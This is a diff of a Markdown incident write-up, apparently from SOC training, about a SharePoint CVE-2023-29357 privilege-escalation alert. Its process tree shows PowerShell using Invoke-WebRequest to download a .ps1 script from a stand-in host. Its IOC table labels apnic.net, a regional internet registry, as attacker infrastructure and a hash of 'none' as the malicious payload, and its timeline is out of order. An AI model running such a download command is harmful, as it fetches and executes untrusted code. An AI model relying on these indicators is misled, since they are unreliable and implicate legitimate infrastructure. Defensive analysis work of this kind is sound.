@@ -2,7 +2,7 @@
 layout: report
 title: "SOC227 — Microsoft SharePoint Server Elevation of Privilege"
 description: "Analyst Write-Up · CVE-2023-29357 Investigation"
-image: /assets/images/projects/sharepoint-cve.png
+image: /assets/images/sharepoint-cve.png
 tags: [sharepoint, cve-2023-29357, privilege-escalation]
 weight: 10
 ---
@@ -18,14 +18,15 @@ weight: 10
 
 ---
 
-## 1️) Executive Summary
+## 1) Executive Summary
+
 On **Oct 6, 2023**, a suspicious Microsoft SharePoint Server Elevation of Privilege (**CVE-2023-29357**) was detected on host `MS-SharePointServer`.  
 Investigation confirmed the activity was **malicious**; containment actions prevented further impact.  
 No lateral movement was observed.
 
 ---
 
-## 2️) Incident Details
+## 2) Incident Details
 
 | Field | Description |
 |-------|-------------|
@@ -41,22 +42,24 @@ No lateral movement was observed.
 
 ---
 
-## 3️) Timeline of Events (CST)
+## 3) Timeline of Events (CST)
+
 | Time  | Event                         |
-|------ |-------------------------------|
-| 20:05 | Detection triggered           |
-| 09:00 | Analyst investigation started |
-| 09:20 | Root cause identified         |
-| 09:30 | Containment performed         |
-| 09:45 | Incident resolved             |
+|-------|--------------------------------|
+| 20:05 | Detection triggered            |
+| 09:00 | Analyst investigation started  |
+| 09:20 | Root cause identified          |
+| 09:30 | Containment performed          |
+| 09:45 | Incident resolved              |
 
 ---
 
-## 4️) Technical Analysis
+## 4) Technical Analysis
 
 **Process Tree**
 ```plaintext
 explorer.exe → powershell.exe → Invoke-WebRequest http://example[.]com/file.ps1
+
 
 ```
 **File Hashes:**  
@@ -113,12 +116,13 @@ explorer.exe → powershell.exe → Invoke-WebRequest http://example[.]com/file.
 ---
 
 ## 9) Indicators of Compromise (IOCs)
-| Type      | Value                  | Description                 |
-|-----------|------------------------|-----------------------------|
-| IP        | 39.91.166.222          | Suspected C2                |
-| File Hash | `none`                 | Malicious payload           |
-| URL       | `http://www.apnic.net` | Download location           |
-| Domain    | `apnic.net`            | Attacker infra              |
+| Type      | Value                  | Description       |
+| --------- | ---------------------- | ----------------- |
+| IP        | 39.91.166.222          | Suspected C2      |
+| File Hash | `none`                 | Malicious payload |
+| URL       | `http://www.apnic.net` | Download location |
+| Domain    | `apnic.net`            | Attacker infra    |
+
 
 ---
 
